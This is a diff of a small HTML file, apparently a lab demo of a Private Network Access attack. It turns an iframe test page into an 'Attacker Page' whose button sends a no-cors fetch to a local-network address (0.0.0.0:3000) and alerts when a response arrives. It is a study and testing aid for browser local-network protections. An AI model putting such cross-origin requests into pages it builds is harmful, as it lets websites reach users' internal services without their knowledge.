@@ -2,23 +2,22 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PNA</title>
-    <style>
-        iframe{
-            width: 400px;
-            height: 500px;
-            border: 1px solid black;
-        }
-    </style>
+    <title>Attacker Page</title>
 </head>
 <body>
-    
-
-    <h2>PNA Attack</h2>
-
-
-    <iframe src="http://0.0.0.0:8080/frame.html" frameborder="1"></iframe>
-
+    <h1>Attacker Interface</h1>
+    <button id="attack">Send Request</button>
+    <script>
+        document.getElementById('attack').addEventListener('click', function() {
+            fetch('http://0.0.0.0:3000/',{mode:"no-cors"})
+                .then(async response => {
+                    console.log(response);
+                    alert("Res Recived")
+                    
+                }
+            ).catch(err=>{console.error(err);
+            })
+        });
+    </script>
 </body>
 </html>
